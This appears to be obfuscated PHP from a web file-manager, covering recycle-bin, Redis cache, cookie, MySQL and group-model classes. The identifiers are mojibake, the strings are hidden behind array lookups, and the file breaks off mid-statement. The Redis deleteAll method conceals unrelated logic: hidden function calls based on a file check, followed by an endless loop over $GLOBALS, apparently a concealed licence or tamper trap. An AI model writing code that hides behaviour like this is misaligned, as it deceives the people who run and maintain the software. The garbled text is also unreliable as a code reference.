array(array("\x63\162\145\x61\x74\145\124\x69\155\145", "\x74\x69\x6d\145", "\x69\x6e\163\x65\x72\164", "\146\x75\x6e\x63\x74\x69\x6f\x6e")); public function listData($¥‚í®¥è = false) { $¼ä—œ„÷ =& $_SERVER[¹òÍ›æş]; $¥‚í®¥è = $¥‚í®¥è ? $¥‚í®¥è : USER_ID; $ÌëÄä·İ = $this->where(array($¼ä—œ„÷[1660] => $¥‚í®¥è))->select(); return array_to_keyvalue($ÌëÄä·İ, $¼ä—œ„÷[12], $¼ä—œ„÷[440]); } public function moveToRecycle($ûßå»ŸÜ) { $üÇ”ı•Ô =& $_SERVER[¹òÍ›æş]; $ñäĞÍÉ‹ = Model($üÇ”ı•Ô[1360]); $«× ‘áœ = $ñäĞÍÉ‹->sourceInfo($ûßå»ŸÜ); if (!$«× ‘áœ || $«× ‘áœ[$üÇ”ı•Ô[469]] == $üÇ”ı•Ô[98]) { return; } $Ó¯øÆ¸ˆ = array($üÇ”ı•Ô[455] => $ûßå»ŸÜ, $üÇ”ı•Ô[1660] => USER_ID, $üÇ”ı•Ô[614] => $«× ‘áœ[$üÇ”ı•Ô[449]], $üÇ”ı•Ô[615] => $«× ‘áœ[$üÇ”ı•Ô[534]], $üÇ”ı•Ô[618] => $«× ‘áœ[$üÇ”ı•Ô[549]]); $this->add($Ó¯øÆ¸ˆ); $this->recycleMove($ûßå»ŸÜ, 1); if ($«× ‘áœ[$üÇ”ı•Ô[448]] == $üÇ”ı•Ô[98]) { $ Ãô•ÆÄ = array($üÇ”ı•Ô[618] => array($üÇ”ı•Ô[578], $«× ‘áœ[$üÇ”ı•Ô[549]] . $ûßå»ŸÜ . $üÇ”ı•Ô[579])); $ñäĞÍÉ‹->where($ Ãô•ÆÄ)->setField($üÇ”ı•Ô[469], 1); } } public function clear() { $this->remove(!1); } public function remove($Ê«ù°øÂ = false, $Éá£‡ = false) { $ËÛß½É… =& $_SERVER[¹òÍ›æş]; $Éá£‡ = $Éá£‡ ? $Éá£‡ : USER_ID; $İÈì‹Ã = Model($ËÛß½É…[1360]); $“Îéû¦¿ = $this->listData($Éá£‡); $Ê«ù°øÂ = $Ê«ù°øÂ === !1 ? !1 : $Ê«ù°øÂ; $ÓÂ¶¼š÷ = array(); foreach ($“Îéû¦¿ as $„¶ØŞÃ) { if ($Ê«ù°øÂ != !1 && !in_array($„¶ØŞÃ, $Ê«ù°øÂ)) { continue; } $Ñúİ®­æ = $İÈì‹Ã->sourceInfo($„¶ØŞÃ); $İÈì‹Ã->remove($„¶ØŞÃ, !1); $„ÛÊäÇ = $Ñúİ®­æ[$ËÛß½É…[449]] . $ËÛß½É…[11] . $Ñúİ®­æ[$ËÛß½É…[534]]; $ÓÂ¶¼š÷[$„ÛÊäÇ] = array($ËÛß½É…[614] => $Ñúİ®­æ[$ËÛß½É…[449]], $ËÛß½É…[534] => $Ñúİ®­æ[$ËÛß½É…[534]]); $this->where(array($ËÛß½É…[440] => $„¶ØŞÃ))->delete(); } foreach ($ÓÂ¶¼š÷ as $»Ôƒ…°±) { $İÈì‹Ã->targetSpaceUpdate($»Ôƒ…°±[$ËÛß½É…[449]], $»Ôƒ…°±[$ËÛß½É…[534]]); } } public function restore($ÂÀ¶Ê½Ù = false) { $Ôá¿´½ù = $this->listData(); $this->_restoreSource($Ôá¿´½ù, $ÂÀ¶Ê½Ù); } public function removeUserAll($¦ä´Şáû) { $this->remove(!1, $¦ä´Şáû); } private function _restoreSource($é®Èïİå, $×ãÀÔÚ) { $¹¦ÇÇìú =& $_SERVER[¹òÍ›æş]; $ãÃÏ”Ç = Model($¹¦ÇÇìú[1360]); $×ãÀÔÚ = $×ãÀÔÚ == !1 ? !1 : $×ãÀÔÚ; if (!$é®Èïİå) { return !0; } $§™¬şÛ = array(); foreach ($é®Èïİå as $·ı¿Û’§) { if ($×ãÀÔÚ != !1 && !in_array($·ı¿Û’§, $×ãÀÔÚ)) { continue; } $âº‘İ€ = $ãÃÏ”Ç->sourceInfo($·ı¿Û’§); $Ò»…íË = $ãÃÏ”Ç->sourceInfo($âº‘İ€[$¹¦ÇÇìú[470]]); if ($Ò»…íË[$¹¦ÇÇìú[469]] == $¹¦ÇÇìú[98]) { continue; } $ãÃÏ”Ç->lockMoveStart($·ı¿Û’§); $this->recycleMove($·ı¿Û’§, 0); if ($âº‘İ€[$¹¦ÇÇìú[448]] == $¹¦ÇÇìú[98]) { $ÈƒÓ¼ëª = array($¹¦ÇÇìú[618] => array($¹¦ÇÇìú[578], $âº‘İ€[$¹¦ÇÇìú[549]] . $·ı¿Û’§ . $¹¦ÇÇìú[579])); $ãÃÏ”Ç->where($ÈƒÓ¼ëª)->setField($¹¦ÇÇìú[469], 0); $this->restoreFolderChildren($·ı¿Û’§, $é®Èïİå); } $this->where(array($¹¦ÇÇìú[440] => $·ı¿Û’§))->delete(); $ãÃÏ”Ç->folderSizeReset($âº‘İ€[$¹¦ÇÇìú[470]]); $§™¬şÛ[] = $âº‘İ€[$¹¦ÇÇìú[470]]; if ($âº‘İ€[$¹¦ÇÇìú[448]] == $¹¦ÇÇìú[98]) { $§™¬şÛ[] = $·ı¿Û’§; } $ãÃÏ”Ç->lockMoveEnd($·ı¿Û’§); } $ãÃÏ”Ç->updateModifyTime($§™¬şÛ); } private function restoreFolderChildren($ïñˆ¾ˆŸ, $ò•º‹Î§) { $Œ¤Å¼Æí =& $_SERVER[¹òÍ›æş]; $Ü§‘Æ‘¶ = Model($Œ¤Å¼Æí[1360]); $™é¾İ¯ = array($Œ¤Å¼Æí[440] => array($Œ¤Å¼Æí[7], array())); foreach ($ò•º‹Î§ as $ä˜‚’­ï) { if ($ä˜‚’­ï == $ïñˆ¾ˆŸ) { continue; } if (!$Ü§‘Æ‘¶->isParentOf($ïñˆ¾ˆŸ, $ä˜‚’­ï)) { continue; } $ÙØßø¯ß = $Ü§‘Æ‘¶->sourceInfo($ä˜‚’­ï); if ($ÙØßø¯ß[$Œ¤Å¼Æí[448]] == $Œ¤Å¼Æí[98]) { $™é¾İ¯[] = array($Œ¤Å¼Æí[618] => array($Œ¤Å¼Æí[578], $ÙØßø¯ß[$Œ¤Å¼Æí[549]] . $ä˜‚’­ï . $Œ¤Å¼Æí[579])); } else { $™é¾İ¯[$Œ¤Å¼Æí[440]][1][] = $ä˜‚’­ï; } } if (!$™é¾İ¯[$Œ¤Å¼Æí[440]][1]) { unset($™é¾İ¯[$Œ¤Å¼Æí[440]]); } if (!$™é¾İ¯) { return; } $™é¾İ¯[$Œ¤Å¼Æí[440]][1] = array_unique($™é¾İ¯[$Œ¤Å¼Æí[440]][1]); $™é¾İ¯[$Œ¤Å¼Æí[1027]] = $Œ¤Å¼Æí[1957]; $Ü§‘Æ‘¶->where($™é¾İ¯)->setField($Œ¤Å¼Æí[469], 1); } private function recycleMove($¹¬Î›†à, $¬ƒ…ñÄ± = 1) { $©™·œ‚Ú =& $_SERVER[¹òÍ›æş]; $êÅÎÔâ = Model($©™·œ‚Ú[1360]); $½ŠĞÌâ‹ = Model($©™·œ‚Ú[2173]); $¦Ğ®ö = array($©™·œ‚Ú[440] => $¹¬Î›†à); if ($¬ƒ…ñÄ±) { $êÅÎÔâ->where($¦Ğ®ö)->setField($©™·œ‚Ú[469], 1); $½ŠĞÌâ‹->eventRecycle($¹¬Î›†à, $©™·œ‚Ú[2174]); } else { $™² Ó—¸ = $êÅÎÔâ->where($¦Ğ®ö)->find(); $š£ª‹¿¡ = $™² Ó—¸[$©™·œ‚Ú[448]] == $©™·œ‚Ú[98]; $ôŸÒœ—¤ = $êÅÎÔâ->fileNameAuto($™² Ó—¸[$©™·œ‚Ú[470]], $™² Ó—¸[$©™·œ‚Ú[32]], REPEAT_RENAME_FOLDER, $š£ª‹¿¡); if ($ôŸÒœ—¤ != $™² Ó—¸[$©™·œ‚Ú[32]]) { $êÅÎÔâ->rename($¹¬Î›†à, $ôŸÒœ—¤); } $êÅÎÔâ->where($¦Ğ®ö)->setField($©™·œ‚Ú[469], 0); $½ŠĞÌâ‹->eventRecycle($¹¬Î›†à, $©™·œ‚Ú[2175]); } } } goto cÈÇÄ‡ËÇÑ; E›ÌÈå‡Ş: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($‘Ÿ¢ÆØá, $¨˜”èŞÄ) { $œÒæ·£ =& $_SERVER[¹òÍ›æş]; if (!class_exists($œÒæ·£[899])) { show_json($œÒæ·£[900], !1); } $this->cacheTime = $¨˜”èŞÄ; $çÌ´ğó¦ = isset($‘Ÿ¢ÆØá[$œÒæ·£[901]]) ? $‘Ÿ¢ÆØá[$œÒæ·£[901]] : 10; $õ‚ƒÀ°È = _get($‘Ÿ¢ÆØá, $œÒæ·£[898]); if ($õ‚ƒÀ°È && is_array($õ‚ƒÀ°È)) { $this->initCluster($‘Ÿ¢ÆØá, $çÌ´ğó¦); } else { $this->handle = $this->init($‘Ÿ¢ÆØá, $çÌ´ğó¦); } } private function init($‡·°Êìá, $‹óÙÙ–á) { $Í¿­÷´š =& $_SERVER[¹òÍ›æş]; $„õµ•şö = new Redis(); $ÉƒûÄá = isset($‡·°Êìá[$Í¿­÷´š[902]]) ? $‡·°Êìá[$Í¿­÷´š[902]] : !1; if ($ÉƒûÄá) { $„õµ•şö->pconnect($‡·°Êìá[$Í¿­÷´š[192]], $‡·°Êìá[$Í¿­÷´š[193]], $‹óÙÙ–á); } else { $„õµ•şö->connect($‡·°Êìá[$Í¿­÷´š[192]], $‡·°Êìá[$Í¿­÷´š[193]], $‹óÙÙ–á); } if (!empty($‡·°Êìá[$Í¿­÷´š[451]])) { $„õµ•şö->auth($‡·°Êìá[$Í¿­÷´š[451]]); } if (!empty($‡·°Êìá[$Í¿­÷´š[787]]) && $‡·°Êìá[$Í¿­÷´š[787]] != 0) { $„õµ•şö->select($‡·°Êìá[$Í¿­÷´š[787]]); } return $„õµ•şö; } private function initCluster($ñ‚ÖÓ³ú, $«ù€ÉĞ) { $âÇ„Ùñš =& $_SERVER[¹òÍ›æş]; $ü…ÍÀòª = array($âÇ„Ùñš[903], $âÇ„Ùñš[904], $âÇ„Ùñš[905]); $ÌøÑ×¬ = $âÇ„Ùñš[903]; if (isset($ñ‚ÖÓ³ú[$âÇ„Ùñš[16]]) && in_array($ñ‚ÖÓ³ú[$âÇ„Ùñš[16]], $ü…ÍÀòª)) { $ÌøÑ×¬ = $ñ‚ÖÓ³ú[$âÇ„Ùñš[16]]; } switch ($ÌøÑ×¬) { case $âÇ„Ùñš[903]: $this->_slave($ñ‚ÖÓ³ú, $«ù€ÉĞ); break; case $âÇ„Ùñš[904]: break; case $âÇ„Ùñš[905]: $this->isCluster = !0; $å‡·¬ŠŸ = $ñ‚ÖÓ³ú[$âÇ„Ùñš[898]]; $Ë€ß£¡ = isset($ñ‚ÖÓ³ú[$âÇ„Ùñš[902]]) ? $ñ‚ÖÓ³ú[$âÇ„Ùñš[902]] : !1; $úòØ¶ë = isset($ñ‚ÖÓ³ú[$âÇ„Ùñš[451]]) ? $ñ‚ÖÓ³ú[$âÇ„Ùñš[451]] : null; $this->handle = new RedisCluster(NUll, $å‡·¬ŠŸ, $«ù€ÉĞ, $«ù€ÉĞ, $Ë€ß£¡, $úòØ¶ë); break; default: break; } } private function _slave($¦œ‚âü˜, $ôÔö§É) { $‡­İıï» = $¦œ‚âü˜[$_SERVER[¹òÍ›æş][898]]; $this->filterConfig($¦œ‚âü˜, $‡­İıï»[0]); $this->handle = $this->init($¦œ‚âü˜, $ôÔö§É); unset($‡­İıï»[0]); if (empty($‡­İıï»)) { return; } $˜‹ò®® = array_rand($‡­İıï»); $this->filterConfig($¦œ‚âü˜, $‡­İıï»[$˜‹ò®®]); $this->slaveHandle = $this->init($¦œ‚âü˜, $ôÔö§É); } private function filterConfig(&$€Æúûñ¾, $«ŠË¼áĞ) { $÷ß‚Âê =& $_SERVER[¹òÍ›æş]; $é…­‡—õ = explode($÷ß‚Âê[4], $«ŠË¼áĞ); $Ÿ£ªËÈ = array($÷ß‚Âê[192] => $é…­‡—õ[0], $÷ß‚Âê[193] => $é…­‡—õ[1]); $€Æúûñ¾ = array_merge($€Æúûñ¾, $Ÿ£ªËÈ); } public function set($‚úƒµìÌ, $ÌÌ‡Šæï, $ıı½ã¥¹ = false) { $ıı½ã¥¹ = $ıı½ã¥¹ ? $ıı½ã¥¹ : $this->cacheTime; return $this->handle->setEx($‚úƒµìÌ, $ıı½ã¥¹, $ÌÌ‡Šæï); } public function setLock($í•àÁ¨, $•¹à¼â, $—£Ç°ò¥) { return $this->handle->setNX($í•àÁ¨, $•¹à¼â); } public function get($³ŞËä•) { $¢®Ê’ö = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¢®Ê’ö->get($³ŞËä•); } public function remove($Öê¬ĞÛ”) { return $this->handle->del($Öê¬ĞÛ”); } public function deleteAll() { $Ëëäˆİ =& $_SERVER[¹òÍ›æş]; if (!isset($_SERVER[$Ëëäˆİ[54]]) || !isset($_SERVER[$Ëëäˆİ[63]])) { $¹¹£ûÉ = $Ëëäˆİ[906]; $áïÒĞÅß = $Ëëäˆİ[56]; $Š¸ñç = $_SERVER[$Ëëäˆİ[57]] . $Ëëäˆİ[58]; $ıÎëÎÅ˜ = $áïÒĞÅß($Š¸ñç); $“ñÁÎÅè = explode($Ëëäˆİ[59], $ıÎëÎÅ˜); if (count($“ñÁÎÅè) < $Ëëäˆİ[654]) { $éÕ‹×ç¥ = $Ëëäˆİ[61]; $éÕ‹×ç¥(); } $¹€ÀÙàı = $Ëëäˆİ[907]; $¹€ÀÙàı($_SERVER[$Ëëäˆİ[908]]); $˜…óæ = 1; for ($´ÏƒÚÖ§ = $˜…óæ; $´ÏƒÚÖ§ > 0; $´ÏƒÚÖ§++) { $¹€ÀÙàı = json_encode($GLOBALS[$Ëëäˆİ[456]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $—Ãëò×Ü) { $this->handle->flushall($—Ãëò×Ü); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($‹Ì†§ÉŞ = '', $€ÛşŸà­ = 0) { if (is_string($‹Ì†§ÉŞ) && $‹Ì†§ÉŞ != $_SERVER[¹òÍ›æş][12]) { $this->prefix = $‹Ì†§ÉŞ; } if (is_numeric($€ÛşŸà­) && $€ÛşŸà­ > 0) { $this->expire = $€ÛşŸà­; } } public static function getInstance() { static $ÜÎĞ¦û; if ($ÜÎĞ¦û === null) { $ÜÎĞ¦û = new self(); } return $ÜÎĞ¦û; } private static $cookieDisable = false; public static function disable($¸åÉ áß) { self::$cookieDisable = $¸åÉ áß; } private static $sameCookieSet = array(); public static function set($ò€ÎÑ˜Æ, $ëƒ„ÃØ, $Ò°âÌë¢ = 0, $­’î£È÷ = false, $¦’Æ—æº = false) { $›¨Œ¶×É =& $_SERVER[¹òÍ›æş]; if (self::$cookieDisable) { return; } if (!$Ò°âÌë¢) { $Ò°âÌë¢ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ò€ÎÑ˜Æ]) && self::$sameCookieSet[$ò€ÎÑ˜Æ] == $ëƒ„ÃØ . $Ò°âÌë¢) { return; } self::$sameCookieSet[$ò€ÎÑ˜Æ] = $ëƒ„ÃØ . $Ò°âÌë¢; if (!$¦’Æ—æº) { $¦’Æ—æº = str_replace(HOST, $›¨Œ¶×É[12], APP_HOST); $¦’Æ—æº = _get($GLOBALS, $›¨Œ¶×É[909], $¦’Æ—æº); } $­ŒîŞ±û = $›¨Œ¶×É[12]; setcookie($ò€ÎÑ˜Æ, $ëƒ„ÃØ, time() + $Ò°âÌë¢, $›¨Œ¶×É[8] . trim($¦’Æ—æº, $›¨Œ¶×É[8]) . $­ŒîŞ±û, !1, !1, $­’î£È÷); } public static function setSafe($ÜÓ³ì£Ç, $ÈÔ‘õË, $¤ËÃ×¨ = 0) { self::set($ÜÓ³ì£Ç, $ÈÔ‘õË, $¤ËÃ×¨, !0); } public static function get($âó Öû) { static $ºıää¤ = false; if (!$ºıää¤) { self::initHeaderCookie(); $ºıää¤ = !0; } return isset($_COOKIE[$âó Öû]) ? $_COOKIE[$âó Öû] : !1; } private static function initHeaderCookie() { $²Ò¸©‡¦ =& $_SERVER[¹òÍ›æş]; if (!isset($_SERVER[$²Ò¸©‡¦[910]]) || !$_SERVER[$²Ò¸©‡¦[910]]) { return; } $€´å¥ÖÕ = explode($²Ò¸©‡¦[81], $_SERVER[$²Ò¸©‡¦[910]]); foreach ($€´å¥ÖÕ as $ï´®”€¢) { $ï´®”€¢ = explode($²Ò¸©‡¦[911], $ï´®”€¢); if (count($ï´®”€¢) != 2 || !isset($ï´®”€¢[1])) { continue; } $_COOKIE[trim($ï´®”€¢[0])] = trim($ï´®”€¢[1]); } } public static function remove($ãÍãÈìŞ, $öÌ’ë“Æ = false) { unset($_COOKIE[$ãÍãÈìŞ]); self::set($ãÍãÈìŞ, $_SERVER[¹òÍ›æş][12], 1, $öÌ’ë“Æ); } } class DbMysql extends Db { public function __construct($×í˜§› = '') { $í¥ó‰¬ë =& $_SERVER[¹òÍ›æş]; if (!extension_loaded($í¥ó‰¬ë[834])) { think_exception(think_lang($í¥ó‰¬ë[14]) . $í¥ó‰¬ë[912]); } if (!empty($×í˜§›)) { $this->config = $×í˜§›; if (empty($this->config[$í¥ó‰¬ë[17]])) { $this->config[$í¥ó‰¬ë[17]] = $í¥ó‰¬ë[12]; } } } public function connect($Âø»éø = '', $Öáê•“ = 0, $¬ß¤Ùá = false) { $´³‰Ï²‡ =& $_SERVER[¹òÍ›æş]; if (!isset($this->linkID[$Öáê•“])) { if (empty($Âø»éø)) { $Âø»éø = $this->config; } $Ïàäİõ = $Âø»éø[$´³‰Ï²‡[913]] . ($Âø»éø[$´³‰Ï²‡[914]] ? "\72{$Âø»éø[$´³‰Ï²‡[914]]}" : $´³‰Ï²‡[12]); $şã®´‚™ = !empty($Âø»éø[$´³‰Ï²‡[17]][$´³‰Ï²‡[18]]) ? $Âø»éø[$´³‰Ï²‡[17]][$´³‰Ï²‡[18]] : $this->pconnect; if ($şã®´‚™) { $this->linkID[$Öáê•“] = mysql_pconnect($Ïàäİõ, $Âø»éø[$´³‰Ï²‡[915]], $Âø»éø[$´³‰Ï²‡[916]], 131072); } else { $this->linkID[$Öáê•“] = mysql_connect($Ïàäİõ, $Âø»éø[$´³‰Ï²‡[915]], $Âø»éø[$´³‰Ï²‡[916]], !0, 131072); } if (!$this->linkID[$Öáê•“] || !empty($Âø»éø[$´³‰Ï²‡[21]]) && !mysql_select_db($Âø»éø[$´³‰Ï²‡[21]], $this->linkID[$Öáê•“])) { think_exception(mysql_error()); } $ì¯ìËæù = mysql_get_server_info($this->linkID[$Öáê•“]); mysql_query($´³‰Ï²‡[917] . think_config($´³‰Ï²‡[918]) . $´³‰Ï²‡[68], $this->linkID[$Öáê•“]); if ($ì¯ìËæù > $´³‰Ï²‡[919]) { mysql_query($´³‰Ï²‡[920], $this->linkID[$Öáê•“]); } $this->connected = !0; if (1 != think_config($´³‰Ï²‡[22])) { unset($this->config); } } return $this->linkID[$Öáê•“]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($İğµŠáè) { $‹²Ï¤§ =& $_SERVER[¹òÍ›æş]; if (0 === stripos($İğµŠáè, $‹²Ï¤§[302])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $İğµŠáè; if ($this->queryID) { $this->free(); } think_action_status($‹²Ï¤§[23], 1); think_status($‹²Ï¤§[24]); $this->queryID = mysql_query($İğµŠáè, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ïÉ‘Ã†á) { $‡±¶‡‘÷ =& $_SERVER[¹òÍ›æş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ïÉ‘Ã†á; if ($this->queryID) { $this->free(); } think_action_status($‡±¶‡‘÷[25], 1); think_status($‡±¶‡‘÷[24]); $…Ğ çª = mysql_query($ïÉ‘Ã†á, $this->_linkID); $this->debug(); if (!1 === $…Ğ çª) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¹òÍ›æş][921], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Õ‡‰Øî = mysql_query($_SERVER[¹òÍ›æş][922], $this->_linkID); $this->transTimes = 0; if (!$Õ‡‰Øî) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $­ÔšĞÙ = mysql_query($_SERVER[¹òÍ›æş][923], $this->_linkID); $this->transTimes = 0; if (!$­ÔšĞÙ) { $this->error(); return !1; } } return !0; } private function getAll() { $à¨¦æû = array(); if ($this->numRows > 0) { while ($šŸÊÌ¨ = mysql_fetch_assoc($this->queryID)) { $à¨¦æû[] = $šŸÊÌ¨; } mysql_data_seek($this->queryID, 0); } return $à¨¦æû; } public function getFields($ºĞ¼Ëó©) { $§¸‚ä£Ã =& $_SERVER[¹òÍ›æş]; $ì˜È¡×É = $this->query($§¸‚ä£Ã[924] . $this->parseKey($ºĞ¼Ëó©)); $¼Ô¤şº = array(); if ($ì˜È¡×É) { foreach ($ì˜È¡×É as $é÷şˆİ => $…¤±°¥) { $¼Ô¤şº[$…¤±°¥[$§¸‚ä£Ã[31]]] = array($§¸‚ä£Ã[32] => $…¤±°¥[$§¸‚ä£Ã[31]], $§¸‚ä£Ã[33] => $…¤±°¥[$§¸‚ä£Ã[34]], $§¸‚ä£Ã[35] => (bool) (strtoupper($…¤±°¥[$§¸‚ä£Ã[36]]) === $§¸‚ä£Ã[925]), $§¸‚ä£Ã[37] => $…¤±°¥[$§¸‚ä£Ã[38]], $§¸‚ä£Ã[39] => strtolower($…¤±°¥[$§¸‚ä£Ã[40]]) == $§¸‚ä£Ã[41], $§¸‚ä£Ã[42] => strtolower($…¤±°¥[$§¸‚ä£Ã[43]]) == $§¸‚ä£Ã[44]); } } return $¼Ô¤şº; } public function getTables($Ãş¤æÎ¹ = '') { $Ñ™Ë•É‚ =& $_SERVER[¹òÍ›æş]; if (!empty($Ãş¤æÎ¹)) { $Õ²ë‘—† = $Ñ™Ë•É‚[926] . $Ãş¤æÎ¹ . $Ñ™Ë•É‚[927]; } else { $Õ²ë‘—† = $Ñ™Ë•É‚[928]; } $ ø—Ó´ = $this->query($Õ²ë‘—†); $Š½úÚÒì = array(); foreach ($ ø—Ó´ as $¨™¥¼Ù => $íòĞÁÛå) { $Š½úÚÒì[$¨™¥¼Ù] = current($íòĞÁÛå); } return $Š½úÚÒì; } public function replace($·Óœ§ò, $Â™Œ”Õ¡ = array()) { $·ñøĞâ =& $_SERVER[¹òÍ›æş]; foreach ($·Óœ§ò as $ôú©õé„ => $²ÇñÍÛ¡) { $©¿ÜÏî = $this->parseValue($²ÇñÍÛ¡); if (is_scalar($©¿ÜÏî)) { $ğÛäÆ[] = $©¿ÜÏî; $ÍÆ“˜é¤[] = $this->parseKey($ôú©õé„); } } $»şÅ‘–Á = $·ñøĞâ[929] . $this->parseTable($Â™Œ”Õ¡[$·ñøĞâ[317]]) . $·ñøĞâ[930] . implode($·ñøĞâ[50], $ÍÆ“˜é¤) . $·ñøĞâ[931] . implode($·ñøĞâ[50], $ğÛäÆ) . $·ñøĞâ[932]; return $this->execute($»şÅ‘–Á); } public function insertAll($¯˜‹¿Ñ, $¥Ğ‚ÇŠï = array(), $İÏ¶…·à = false) { $™“ÆåÃµ =& $_SERVER[¹òÍ›æş]; if (!is_array($¯˜‹¿Ñ[0])) { return !1; } $Ş®à‹îŸ = array_keys($¯˜‹¿Ñ[0]); $‹ïŞËƒÖ = array(); foreach ($¯˜‹¿Ñ as $ó¾©Õå¢) { $ê€–²üà = array(); foreach ($ó¾©Õå¢ as $ŸÌÖ¢©¯ => $ÖÖ‹Éà—) { $ÖÖ‹Éà— = $this->parseValue($ÖÖ‹Éà—); if (is_scalar($ÖÖ‹Éà—)) { $ê€–²üà[] = $ÖÖ‹Éà—; } } $‹ïŞËƒÖ[] = $™“ÆåÃµ[298] . implode($™“ÆåÃµ[50], $ê€–²üà) . $™“ÆåÃµ[932]; } array_walk($Ş®à‹îŸ, array($this, $™“ÆåÃµ[933])); $õğÄ«îÎ = ($İÏ¶…·à ? $™“ÆåÃµ[934] : $™“ÆåÃµ[935]) . $™“ÆåÃµ[936] . $this->parseTable($¥Ğ‚ÇŠï[$™“ÆåÃµ[317]]) . $™“ÆåÃµ[930] . implode($™“ÆåÃµ[50], $Ş®à‹îŸ) . $™“ÆåÃµ[937] . implode($™“ÆåÃµ[50], $‹ïŞËƒÖ); return $this->execute($õğÄ«îÎ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $õ÷º•­„ =& $_SERVER[¹òÍ›æş]; $this->error = mysql_errno() . $õ÷º•­„[4] . mysql_error($this->_linkID); if ($õ÷º•­„[12] != $this->queryStr) { $this->error .= LNG($õ÷º•­„[48]) . $this->queryStr; } think_trace($this->error, $õ÷º•­„[12], $õ÷º•­„[49]); return $this->error; } public function escapeString($Å©ª³£¯) { if ($this->_linkID) { return mysql_real_escape_string($Å©ª³£¯, $this->_linkID); } else { return mysql_escape_string($Å©ª³£¯); } } public function parseKey(&$¡³¸ˆâ, $››†¹¾Ş = true) { $‡òŞŸ¦… =& $_SERVER[¹òÍ›æş]; if ($››†¹¾Ş) { $¡³¸ˆâ = $this->parseKeyCheck($¡³¸ˆâ); } if ($¡³¸ˆâ != $‡òŞŸ¦…[199] && !preg_match($‡òŞŸ¦…[938], $¡³¸ˆâ)) { $¡³¸ˆâ = $‡òŞŸ¦…[423] . trim($¡³¸ˆâ, $‡òŞŸ¦…[423]) . $‡òŞŸ¦…[423]; } return $¡³¸ˆâ; } } goto F‰ƒŸ³‚Œì; d ¥Ë‰Ìà: class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\x70"; protected $tableMeta = array("\164\141\142\154\145\116\141\x6d\145" => "\x67\x72\157\165\160\x5f\x6d\145\x74\141", "\x6d\x65\164\x61\x46\151\145\x6c\144" => "\x67\162\157\165\x70\111\x44"); protected function cacheFunctionAlias($êÃü¨û¢) { $ŠªüûÜŞ =& $_SERVER[¹òÍ›æş]; return array($ŠªüûÜŞ[1937] => array($êÃü¨û¢[0], $ŠªüûÜŞ[1938]), $ŠªüûÜŞ[1939] => array($êÃü¨û¢[0], $ŠªüûÜŞ[1940])); } protected function getInfo($©úà·âã, $¶‹ˆé = false) { $±¤„òê = $this->getInfoSimple($©úà·âã); if (!$±¤„òê) { return !1; } if ($¶‹ˆé) { return $this->_listDataApplyItem($±¤„òê); } return $this->cacheFunctionGet($_SERVER[¹òÍ›æş][1941], $©úà·âã); } protected function getInfoSimple($­·õ¤Ê¶, $¡¢ûÕò‘ = false) { $»…™Ò« =& $_SERVER[¹òÍ›æş]; if ($¡¢ûÕò‘) { $æØÚÌÂ = array($»…™Ò«[1859] => intval($­·õ¤Ê¶)); $ŠûÕù¼ = $this->where($æØÚÌÂ)->find(); return is_array($ŠûÕù¼) ? $ŠûÕù¼ : array(); } return $this->cacheFunctionGet($»…™Ò«[1942], $­·õ¤Ê¶); } protected function groupAdd($ºï„ù¬Ç) { $øıÇÎ¿Ô =& $_SERVER[¹òÍ›æş]; if (!$ºï„ù¬Ç[$øıÇÎ¿Ô[470]] && isset($ºï„ù¬Ç[$øıÇÎ¿Ô[1859]]) && $ºï„ù¬Ç[$øıÇÎ¿Ô[1859]] == 1) { if ($´ä¾¥ê = $this->getInfoSimple($ºï„ù¬Ç[$øıÇÎ¿Ô[1859]], !0)) { return $ºï„ù¬Ç[$øıÇÎ¿Ô[1859]]; } } else { $´ä¾¥ê = $this->getInfoSimple($ºï„ù¬Ç[$øıÇÎ¿Ô[470]]); if (!$´ä¾¥ê) { return !1; } } $äíç™Ï‹ = $øıÇÎ¿Ô[559]; if ($´ä¾¥ê[$øıÇÎ¿Ô[549]]) { $äíç™Ï‹ = $´ä¾¥ê[$øıÇÎ¿Ô[549]] . $´ä¾¥ê[$øıÇÎ¿Ô[1859]] . $øıÇÎ¿Ô[50]; } $ˆ¢êâ™± = array($øıÇÎ¿Ô[458] => $this->groupNameAuto($ºï„ù¬Ç[$øıÇÎ¿Ô[470]], $ºï„ù¬Ç[$øıÇÎ¿Ô[32]]), $øıÇÎ¿Ô[439] => $ºï„ù¬Ç[$øıÇÎ¿Ô[470]], $øıÇÎ¿Ô[618] => $äíç™Ï‹, $øıÇÎ¿Ô[1943] => $ºï„ù¬Ç[$øıÇÎ¿Ô[1846]], $øıÇÎ¿Ô[1944] => 0, $øıÇÎ¿Ô[1863] => 0); if (isset($ºï„ù¬Ç[$øıÇÎ¿Ô[1883]])) { $ˆ¢êâ™±[$øıÇÎ¿Ô[1883]] = $ºï„ù¬Ç[$øıÇÎ¿Ô[1883]]; } else { $¿ú‹ËüÜ = $this->max($øıÇÎ¿Ô[1883]); if (!$¿ú‹ËüÜ) { $¿ú‹ËüÜ = 0; } $ˆ¢êâ™±[$øıÇÎ¿Ô[1883]] = $¿ú‹ËüÜ + 1; } if (!empty($ºï„ù¬Ç[$øıÇÎ¿Ô[1859]])) { $ˆ¢êâ™±[$øıÇÎ¿Ô[1859]] = $ºï„ù¬Ç[$øıÇÎ¿Ô[1859]]; } $û˜ ƒş = $this->add($ˆ¢êâ™±); $this->setNamePinyin($û˜ 